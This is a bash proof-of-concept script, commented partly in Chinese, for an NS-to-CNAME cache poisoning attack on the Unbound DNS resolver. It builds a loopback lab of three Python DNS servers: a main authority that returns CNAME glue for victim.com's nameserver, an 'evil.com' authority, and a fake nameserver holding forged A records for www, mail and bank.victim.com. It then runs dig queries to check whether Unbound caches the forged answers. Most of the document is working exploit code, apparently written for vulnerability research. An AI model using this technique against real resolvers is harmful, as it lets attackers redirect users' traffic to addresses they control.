#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════
#  NS→CNAME Cache Poisoning PoC v5 — 迭代解析 + dig 输出
#  
#  v1 已经证明 Fake NS 收到了查询！但手工 DNS 解析器有 bug。
#  本版使用 dig 解析输出，更可靠。
#
#  架构：
#    127.0.0.2:53 — com + victim.com + safe.com 权威
#    127.0.0.3:53 — evil.com 权威（攻击者）
#    127.0.0.1:53 — Fake NS（攻击者的伪造 NS）
#    Unbound port 5353 — root hints → 127.0.0.2
# ═══════════════════════════════════════════════════════════════════
set -euo pipefail

export DEBIAN_FRONTEND=noninteractive
apt-get update -qq > /dev/null 2>&1
apt-get install -y -qq dnsutils python3 > /dev/null 2>&1

VDIR="/workspace/output/unbound-cache-poison-test-v5"
mkdir -p "$VDIR"
UNBOUND="/workspace/output/unbound-binary-baseline"

kill_all() {
  pkill -f "python3" 2>/dev/null || true
  pkill -f "unbound.*5353" 2>/dev/null || true
  sleep 1
}
kill_all

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  NS→CNAME Cache Poisoning PoC v5                            ║"
echo "╚══════════════════════════════════════════════════════════════╝"

ip addr add 127.0.0.2/8 dev lo 2>/dev/null || true
ip addr add 127.0.0.3/8 dev lo 2>/dev/null || true

# ═══ Auth on 127.0.0.2:53 — serves root + com + victim.com + safe.com ═══
cat > "$VDIR/auth_main.py" << 'PYEOF'
#!/usr/bin/env python3
"""
Auth on 127.0.0.2:53 — root + com + victim.com + safe.com
Referral handling: 
  - For queries IN a delegated sub-zone (victim.com, evil.com, safe.com):
    return referral with glue in additional section
  - For victim.com CNAME: return from victim.com zone directly
  - For www.victim.com A: DO NOT return (force Unbound to use NS)
"""
import socket, struct, time, json, sys

LOG = "/workspace/output/unbound-cache-poison-test-v5/main_queries.jsonl"

def enc(name):
    if not name or name == '.': return b'\x00'
    r = b''
    for label in name.rstrip('.').split('.'):
        if label: r += bytes([len(label)]) + label.encode('ascii')
    return r + b'\x00'

def enc_rr(name, rtype, rclass, ttl, rdata):
    return enc(name) + struct.pack('!HHI', rtype, rclass, ttl) + struct.pack('!H', len(rdata)) + rdata

def log_q(qname, qtype, from_ip, rtype):
    with open(LOG, 'a') as f:
        f.write(json.dumps({'ts': time.monotonic(), 'qname': qname, 'qtype': qtype, 'from': from_ip, 'resp': rtype}) + '\n')
    print(f"[MAIN] {from_ip}: {qname} {qtype} → {rtype}", flush=True)

# ─── Root zone ───
ROOT_SOA = enc('ns1.') + enc('admin.') + struct.pack('!IIIII', 2026100901, 3600, 900, 604800, 86400)
ROOT_NS = enc('ns1.')
ROOT_NS_A = struct.pack('!I', 0x7f000002)

# ─── com zone: delegations ───
COM_SOA = enc('ns1.com.') + enc('admin.com.') + struct.pack('!IIIII', 2026100902, 3600, 900, 604800, 86400)
COM_NS = enc('ns1.com.')
COM_NS_A = struct.pack('!I', 0x7f000002)

# Delegations from com zone
DELEGATIONS = {
    'victim.com': {
        'ns_rdata': enc('ns.victim.com.'),
        'glue': [
            # CRITICAL: CNAME glue — ns.victim.com is a CNAME
            ('ns.victim.com.', 5, 300, enc('resolve.evil.com.')),
        ],
    },
    'evil.com': {
        'ns_rdata': enc('ns.evil.com.'),
        'glue': [
            ('ns.evil.com.', 1, 300, struct.pack('!I', 0x7f000003)),
        ],
    },
    'safe.com': {
        'ns_rdata': enc('ns.safe.com.'),
        'glue': [
            ('ns.safe.com.', 1, 300, struct.pack('!I', 0x7f000002)),
        ],
    },
}

# ─── victim.com zone: ONLY SOA, NS, CNAME (no A records for www) ───
VICTIM_SOA = enc('ns.victim.com.') + enc('admin.victim.com.') + struct.pack('!IIIII', 2026100903, 3600, 900, 604800, 86400)
VICTIM_NS = enc('ns.victim.com.')
VICTIM_CNAME = enc('resolve.evil.com.')  # ns.victim.com CNAME → resolve.evil.com

# ─── safe.com zone ───
SAFE_SOA = enc('ns.safe.com.') + enc('admin.safe.com.') + struct.pack('!IIIII', 2026100905, 3600, 900, 604800, 86400)
SAFE_NS = enc('ns.safe.com.')
SAFE_NS_A = struct.pack('!I', 0x7f000002)
SAFE_WWW_A = struct.pack('!I', 0x05050505)

QTM = {1:'A',2:'NS',5:'CNAME',6:'SOA'}

def build_referral(txid, qname, qtype, qclass, deleg_name, deleg_info):
    flags = 0x8000  # QR=1, AA=0
    glue = deleg_info['glue']
    hdr = struct.pack('!HHHHHH', txid, flags, 1, 0, 1, len(glue))
    q = enc(qname) + struct.pack('!HH', qtype, qclass)
    auth = enc_rr(deleg_name, 2, qclass, 300, deleg_info['ns_rdata'])
    add = b''
    for gname, gtype, gttl, grdata in glue:
        add += enc_rr(gname, gtype, qclass, gttl, grdata)
    return hdr + q + auth + add

def build_root_ns_response(txid, qclass):
    flags = 0x8400
    hdr = struct.pack('!HHHHHH', txid, flags, 1, 1, 0, 1)
    q = enc('.') + struct.pack('!HH', 2, qclass)
    answer = enc_rr('.', 2, qclass, 300, ROOT_NS)
    additional = enc_rr('ns1.', 1, qclass, 300, ROOT_NS_A)
    return hdr + q + answer + additional

def find_deleg(qname):
    qn = qname.lower().rstrip('.')
    for dname, info in DELEGATIONS.items():
        dn = dname.lower().rstrip('.')
        if qn == dn or qn.endswith('.' + dn):
            return dname, info
    return None, None

def handle_query(data, addr, sock):
    if len(data) < 12: return
    txid, flags, qdcount = struct.unpack('!HHH', data[:6])
    if (flags >> 15) != 0: return
    off = 12; labels = []
    while off < len(data) and data[off] != 0:
        ll = data[off]
        if ll == 0 or off+1+ll > len(data): break
        if ll > 63: off += 2; break
        labels.append(data[off+1:off+1+ll].decode('ascii', errors='replace'))
        off += 1 + ll
    else: off += 1
    qname = '.'.join(labels)
    if off+4 > len(data): return
    qt, qc = struct.unpack('!HH', data[off:off+4])
    qtn = QTM.get(qt, f'T{qt}')
    
    qn = qname.lower().rstrip('.')
    
    # ── Root zone: NS query ──
    if qn == '' and qt == 2:
        resp = build_root_ns_response(txid, qc)
        log_q(qname, qtn, addr[0], 'AUTH(root NS + glue)')
        sock.sendto(resp, addr)
        return
    
    # ── Root zone: ns1. A query ──
    if qn == 'ns1' and qt == 1:
        resp = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
        resp += enc('ns1.') + struct.pack('!HH', qt, qc)
        resp += enc_rr('ns1.', 1, qc, 300, ROOT_NS_A)
        log_q(qname, qtn, addr[0], 'AUTH(root ns1 A)')
        sock.sendto(resp, addr)
        return
    
    # ── com zone: delegation queries ──
    dname, dinfo = find_deleg(qname)
    if dinfo and qn != 'evil.com':
        # For NS/SOA of the delegated zone, still return referral
        # (so Unbound discovers the delegation and resolves NS address)
        resp = build_referral(txid, qname, qt, qc, dname, dinfo)
        log_q(qname, qtn, addr[0], f'REFERRAL→{dname}')
        sock.sendto(resp, addr)
        return
    
    # ── com zone: SOA/NS ──
    if qn == 'com' and qt in (2, 6):
        if qt == 2:
            resp = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 1)
            resp += enc('com.') + struct.pack('!HH', qt, qc)
            resp += enc_rr('com.', 2, qc, 300, COM_NS)
            resp += enc_rr('ns1.com.', 1, qc, 300, COM_NS_A)
        else:
            resp = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
            resp += enc('com.') + struct.pack('!HH', qt, qc)
            resp += enc_rr('com.', 6, qc, 300, COM_SOA)
        log_q(qname, qtn, addr[0], 'AUTH(com)')
        sock.sendto(resp, addr)
        return
    
    # ── ns1.com A ──
    if qn == 'ns1.com' and qt == 1:
        resp = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
        resp += enc('ns1.com.') + struct.pack('!HH', qt, qc)
        resp += enc_rr('ns1.com.', 1, qc, 300, COM_NS_A)
        log_q(qname, qtn, addr[0], 'AUTH(ns1.com A)')
        sock.sendto(resp, addr)
        return
    
    # ── victim.com zone: SOA, NS, CNAME ──
    if qn == 'victim.com' and qt in (2, 6):
        if qt == 2:
            resp = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
            resp += enc('victim.com.') + struct.pack('!HH', qt, qc)
            resp += enc_rr('victim.com.', 2, qc, 300, VICTIM_NS)
        else:
            resp = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
            resp += enc('victim.com.') + struct.pack('!HH', qt, qc)
            resp += enc_rr('victim.com.', 6, qc, 300, VICTIM_SOA)
        log_q(qname, qtn, addr[0], 'AUTH(victim.com)')
        sock.sendto(resp, addr)
        return
    
    if qn == 'ns.victim.com' and qt in (1, 5):
        # Return CNAME: ns.victim.com → resolve.evil.com
        resp = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
        resp += enc('ns.victim.com.') + struct.pack('!HH', qt, qc)
        resp += enc_rr('ns.victim.com.', 5, qc, 300, VICTIM_CNAME)
        log_q(qname, qtn, addr[0], 'AUTH(ns.victim.com CNAME)')
        sock.sendto(resp, addr)
        return
    
    # ── victim.com: www etc → NODATA (force Unbound to use fake NS) ──
    if qn.endswith('.victim.com'):
        resp = struct.pack('!HHHHHH', txid, 0x8400, 1, 0, 1, 0)
        resp += enc(qname) + struct.pack('!HH', qt, qc)
        resp += enc_rr('victim.com.', 6, qc, 300, VICTIM_SOA)
        log_q(qname, qtn, addr[0], 'NODATA(victim.com)')
        sock.sendto(resp, addr)
        return
    
    # ── safe.com zone ──
    if qn == 'safe.com' and qt in (2, 6):
        if qt == 2:
            resp = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
            resp += enc('safe.com.') + struct.pack('!HH', qt, qc)
            resp += enc_rr('safe.com.', 2, qc, 300, SAFE_NS)
        else:
            resp = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
            resp += enc('safe.com.') + struct.pack('!HH', qt, qc)
            resp += enc_rr('safe.com.', 6, qc, 300, SAFE_SOA)
        log_q(qname, qtn, addr[0], 'AUTH(safe.com)')
        sock.sendto(resp, addr)
        return
    
    if qn == 'ns.safe.com' and qt == 1:
        resp = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
        resp += enc('ns.safe.com.') + struct.pack('!HH', qt, qc)
        resp += enc_rr('ns.safe.com.', 1, qc, 300, SAFE_NS_A)
        log_q(qname, qtn, addr[0], 'AUTH(ns.safe.com A)')
        sock.sendto(resp, addr)
        return
    
    if qn == 'www.safe.com' and qt == 1:
        resp = struct.pack('!HHHHHH', txid, 0x8400, 1, 1, 0, 0)
        resp += enc('www.safe.com.') + struct.pack('!HH', qt, qc)
        resp += enc_rr('www.safe.com.', 1, qc, 300, SAFE_WWW_A)
        log_q(qname, qtn, addr[0], 'AUTH(www.safe.com A)')
        sock.sendto(resp, addr)
        return
    
    # ── Refused ──
    resp = struct.pack('!HHHHHH', txid, 0x8005, 1, 0, 0, 0)
    resp += enc(qname) + struct.pack('!HH', qt, qc)
    log_q(qname, qtn, addr[0], 'REFUSED')
    sock.sendto(resp, addr)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.2', 53))
print("[MAIN] Listening on 127.0.0.2:53", flush=True)

while True:
    try:
        data, addr = sock.recvfrom(4096)
        handle_query(data, addr, sock)
    except Exception as e:
        print(f"[MAIN] Error: {e}", flush=True, file=sys.stderr)
PYEOF

# ═══ Evil.com auth on 127.0.0.3:53 ═══
cat > "$VDIR/auth_evil.py" << 'PYEOF'
#!/usr/bin/env python3
import socket, struct, time, json, sys

LOG = "/workspace/output/unbound-cache-poison-test-v5/evil_queries.jsonl"

def enc(name):
    if not name or name == '.': return b'\x00'
    r = b''
    for l in name.rstrip('.').split('.'):
        if l: r += bytes([len(l)]) + l.encode('ascii')
    return r + b'\x00'

def enc_rr(name, rtype, rclass, ttl, rdata):
    return enc(name) + struct.pack('!HHI', rtype, rclass, ttl) + struct.pack('!H', len(rdata)) + rdata

def log_q(qname, qtype, from_ip):
    with open(LOG, 'a') as f:
        f.write(json.dumps({'ts': time.monotonic(), 'qname': qname, 'qtype': qtype, 'from': from_ip}) + '\n')
    print(f"[EVIL] {from_ip}: {qname} {qtype}", flush=True)

EVIL_SOA = enc('ns.evil.com.') + enc('admin.evil.com.') + struct.pack('!IIIII', 2026100904, 3600, 900, 604800, 86400)
RECORDS = {
    ('evil.com', 6): [(300, EVIL_SOA)],
    ('evil.com', 2): [(300, enc('ns.evil.com.'))],
    ('ns.evil.com', 1): [(300, struct.pack('!I', 0x7f000003))],
    ('resolve.evil.com', 1): [(300, struct.pack('!I', 0x7f000001))],  # A 127.0.0.1 → FAKE NS
}

QTM = {1:'A',2:'NS',5:'CNAME',6:'SOA'}

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.3', 53))
print("[EVIL] Listening on 127.0.0.3:53", flush=True)

while True:
    try:
        data, addr = sock.recvfrom(4096)
        if len(data) < 12: continue
        txid, flags, qdcount = struct.unpack('!HHH', data[:6])
        if (flags >> 15) != 0: continue
        off = 12; labels = []
        while off < len(data) and data[off] != 0:
            ll = data[off]
            if ll == 0 or off+1+ll > len(data): break
            if ll > 63: off += 2; break
            labels.append(data[off+1:off+1+ll].decode('ascii', errors='replace'))
            off += 1 + ll
        else: off += 1
        qname = '.'.join(labels)
        if off+4 > len(data): continue
        qt, qc = struct.unpack('!HH', data[off:off+4])
        qtn = QTM.get(qt, f'T{qt}')
        log_q(qname, qtn, addr[0])
        qn = qname.lower().rstrip('.')
        answers = []
        if (qn, qt) in RECORDS:
            for ttl, rd in RECORDS[(qn, qt)]:
                answers.append((qname, qt, ttl, rd))
        if answers:
            hdr = struct.pack('!HHHHHH', txid, 0x8400, 1, len(answers), 0, 0)
            q = enc(qname) + struct.pack('!HH', qt, qc)
            a = b''
            for n, t, ttl, rd in answers:
                a += enc_rr(n, t, qc, ttl, rd)
            sock.sendto(hdr + q + a, addr)
        else:
            hdr = struct.pack('!HHHHHH', txid, 0x8403, 1, 0, 1, 0)
            q = enc(qname) + struct.pack('!HH', qt, qc)
            auth = enc_rr('evil.com.', 6, qc, 300, EVIL_SOA)
            sock.sendto(hdr + q + auth, addr)
    except Exception as e:
        print(f"[EVIL] Error: {e}", flush=True, file=sys.stderr)
PYEOF

# ═══ Fake NS on 127.0.0.1:53 ═══
cat > "$VDIR/fake_ns.py" << 'PYEOF'
#!/usr/bin/env python3
import socket, struct, time, json, sys

LOG = "/workspace/output/unbound-cache-poison-test-v5/fake_queries.jsonl"

def enc(name):
    if not name or name == '.': return b'\x00'
    r = b''
    for l in name.rstrip('.').split('.'):
        if l: r += bytes([len(l)]) + l.encode('ascii')
    return r + b'\x00'

def enc_rr(name, rtype, rclass, ttl, rdata):
    return enc(name) + struct.pack('!HHI', rtype, rclass, ttl) + struct.pack('!H', len(rdata)) + rdata

def log_q(qname, qtype, from_ip):
    with open(LOG, 'a') as f:
        f.write(json.dumps({'ts': time.monotonic(), 'qname': qname, 'qtype': qtype, 'from': from_ip}) + '\n')
    print(f"[FAKE] {from_ip}: {qname} {qtype}  ← ATTACKER GOT QUERY!", flush=True)

FORGED_SOA = enc('ns.victim.com.') + enc('admin.victim.com.') + struct.pack('!IIIII', 999, 3600, 900, 604800, 86400)
FORGED = {
    ('victim.com', 6): [(300, FORGED_SOA)],
    ('victim.com', 2): [(300, enc('ns.victim.com.'))],
    ('ns.victim.com', 1): [(300, struct.pack('!I', 0x7f000001))],
    ('www.victim.com', 1): [(300, struct.pack('!I', 0x06060606))],
    ('mail.victim.com', 1): [(300, struct.pack('!I', 0x06060607))],
    ('bank.victim.com', 1): [(300, struct.pack('!I', 0x06060608))],
}

QTM = {1:'A',2:'NS',5:'CNAME',6:'SOA'}

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('127.0.0.1', 53))
print("[FAKE] Listening on 127.0.0.1:53 — FORGED records", flush=True)

while True:
    try:
        data, addr = sock.recvfrom(4096)
        if len(data) < 12: continue
        txid, flags, qdcount = struct.unpack('!HHH', data[:6])
        if (flags >> 15) != 0: continue
        off = 12; labels = []
        while off < len(data) and data[off] != 0:
            ll = data[off]
            if ll == 0 or off+1+ll > len(data): break
            if ll > 63: off += 2; break
            labels.append(data[off+1:off+1+ll].decode('ascii', errors='replace'))
            off += 1 + ll
        else: off += 1
        qname = '.'.join(labels)
        if off+4 > len(data): continue
        qt, qc = struct.unpack('!HH', data[off:off+4])
        qtn = QTM.get(qt, f'T{qt}')
        log_q(qname, qtn, addr[0])
        qn = qname.lower().rstrip('.')
        answers = []
        if (qn, qt) in FORGED:
            for ttl, rd in FORGED[(qn, qt)]:
                answers.append((qname, qt, ttl, rd))
        if answers:
            hdr = struct.pack('!HHHHHH', txid, 0x8400, 1, len(answers), 0, 0)
            q = enc(qname) + struct.pack('!HH', qt, qc)
            a = b''
            for n, t, ttl, rd in answers:
                a += enc_rr(n, t, qc, ttl, rd)
            sock.sendto(hdr + q + a, addr)
        else:
            hdr = struct.pack('!HHHHHH', txid, 0x8403, 1, 0, 1, 0)
            q = enc(qname) + struct.pack('!HH', qt, qc)
            auth = enc_rr('victim.com.', 6, qc, 300, FORGED_SOA)
            sock.sendto(hdr + q + auth, addr)
    except Exception as e:
        print(f"[FAKE] Error: {e}", flush=True, file=sys.stderr)
PYEOF

# Start servers
> "$VDIR/main_queries.jsonl" 2>/dev/null || true
> "$VDIR/evil_queries.jsonl" 2>/dev/null || true
> "$VDIR/fake_queries.jsonl" 2>/dev/null || true

python3 "$VDIR/auth_main.py" > "$VDIR/main.log" 2>&1 &
MAIN_PID=$!
sleep 0.5

python3 "$VDIR/auth_evil.py" > "$VDIR/evil.log" 2>&1 &
EVIL_PID=$!
sleep 0.5

python3 "$VDIR/fake_ns.py" > "$VDIR/fake.log" 2>&1 &
FAKE_PID=$!
sleep 0.5

echo "  Servers: main=$MAIN_PID, evil=$EVIL_PID, fake=$FAKE_PID"

# ═══ Unbound with root hints ═══
echo ""
echo "═══ Starting Unbound ═══"

cat > "$VDIR/hint" << 'EOF'
. IN NS ns1.
ns1. IN A 127.0.0.2
EOF

cat > "$VDIR/ub.conf" << 'CONF'
server:
    directory: "/workspace/output/unbound-cache-poison-test-v5"
    pidfile: "/workspace/output/unbound-cache-poison-test-v5/unbound.pid"
    port: 5353
    interface: 127.0.0.1@5353
    do-ip6: no
    access-control: 127.0.0.0/8 allow
    username: ""
    chroot: ""
    do-daemonize: no
    use-syslog: no
    logfile: "/workspace/output/unbound-cache-poison-test-v5/unbound.log"
    verbosity: 3
    log-queries: yes
    log-replies: yes
    do-not-query-localhost: no
    root-hints: "/workspace/output/unbound-cache-poison-test-v5/hint"
    domain-insecure: "victim.com"
    domain-insecure: "evil.com"
    domain-insecure: "safe.com"
    domain-insecure: "com"
    domain-insecure: "."
    harden-glue: no
    harden-dnssec-stripped: no
    val-permissive-mode: yes
    prefetch: no

remote-control:
    control-enable: no
CONF

"$UNBOUND" -c "$VDIR/ub.conf" -d > "$VDIR/unbound_stdout.log" 2>&1 &
UB_PID=$!
sleep 3

if kill -0 "$UB_PID" 2>/dev/null; then
  echo "  Unbound started (PID=$UB_PID)"
else
  echo "  Unbound FAILED:"
  cat "$VDIR/unbound.log" | head -30
  kill_all; exit 1
fi

# ═══ ATTACK TEST using dig ═══
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  ATTACK TEST (using dig for reliable output)                ║"
echo "╚══════════════════════════════════════════════════════════════╝"

echo ""
echo "  ─── Step 1: Root priming verification ───"
dig @127.0.0.1 -p 5353 . NS +time=5 2>&1 | grep -E "ANSWER|flags|NS" | head -5

echo ""
echo "  ─── Step 2: Control — safe.com (NS→A, no CNAME) ───"
dig @127.0.0.1 -p 5353 www.safe.com A +time=10 2>&1 | grep -E "ANSWER|flags|www\.safe" | head -5

echo ""
echo "  ─── Step 3: Resolve ns.victim.com (CNAME chase) ───"
> "$VDIR/fake_queries.jsonl" 2>/dev/null || true
dig @127.0.0.1 -p 5353 ns.victim.com A +time=10 2>&1 | grep -E "ANSWER|flags|ns\.victim|CNAME|resolve" | head -8

echo ""
echo "  ─── Step 4: ATTACK — www.victim.com ───"
> "$VDIR/fake_queries.jsonl" 2>/dev/null || true
echo "  Expected legitimate: 1.2.3.4 (but 127.0.0.2 returns NODATA)"
echo "  Expected forged:     6.6.6.6 (from fake NS at 127.0.0.1)"
echo ""
dig @127.0.0.1 -p 5353 www.victim.com A +time=15 2>&1 | grep -E "ANSWER|flags|victim|CNAME|status" | head -10
sleep 1

# Check if fake NS was queried
FAKE_N=$(wc -l < "$VDIR/fake_queries.jsonl" 2>/dev/null || echo 0)
echo ""
echo "  Fake NS queries: $FAKE_N"
if [ "$FAKE_N" -gt 0 ] 2>/dev/null; then
  echo "  ⚠ Unbound DID query the Fake NS (127.0.0.1)!"
  cat "$VDIR/fake_queries.jsonl" 2>/dev/null | python3 -c "
import sys, json
for line in sys.stdin:
    if line.strip():
        q = json.loads(line)
        print(f\"    {q['qname']:<30} {q['qtype']:<8}  ← UNAUTHORIZED!\")" 2>/dev/null
fi

# ═══ Server log analysis ═══
echo ""
echo "═══ Server log analysis ═══"

echo ""
echo "  ─── Main auth (127.0.0.2) ───"
cat "$VDIR/main_queries.jsonl" 2>/dev/null | python3 -c "
import sys, json
qs = [json.loads(l) for l in sys.stdin if l.strip()]
print(f'  Total: {len(qs)}')
for q in qs:
    print(f\"    {q['qname']:<30} {q['qtype']:<8} → {q['resp']}\")" 2>/dev/null || echo "  (none)"

echo ""
echo "  ─── Evil auth (127.0.0.3) ───"
cat "$VDIR/evil_queries.jsonl" 2>/dev/null | python3 -c "
import sys, json
qs = [json.loads(l) for l in sys.stdin if l.strip()]
print(f'  Total: {len(qs)}')
for q in qs:
    print(f\"    {q['qname']:<30} {q['qtype']:<8}\")" 2>/dev/null || echo "  (none)"

# ═══ Unbound log ═══
echo ""
echo "═══ Unbound log (key entries) ═══"
grep -i "victim\|cname\|evil\|resolve\|fake\|ns\.victim\|query restart\|target\|sending to" "$VDIR/unbound.log" 2>/dev/null | head -50 || echo "  (none)"

echo ""
echo "═══ Unbound log (errors) ═══"
grep -i "servfail\|fail\|error\|exceed\|prime.*fail\|out of.*target" "$VDIR/unbound.log" 2>/dev/null | head -15 || echo "  (none)"

# ═══ Result ═══
echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  Key Evidence Summary                                       ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
echo "  • Fake NS (127.0.0.1:53) received $FAKE_N queries"
echo "  • If Fake NS received queries, it proves Unbound used the"
echo "    CNAME-resolved IP as victim.com's NS address"
echo "  • If Unbound returned forged data (6.6.6.6), cache poisoning"
echo "    is fully proved"

kill_all
kill "$MAIN_PID" "$EVIL_PID" "$FAKE_PID" 2>/dev/null || true
echo ""
echo "=== Test Complete ==="
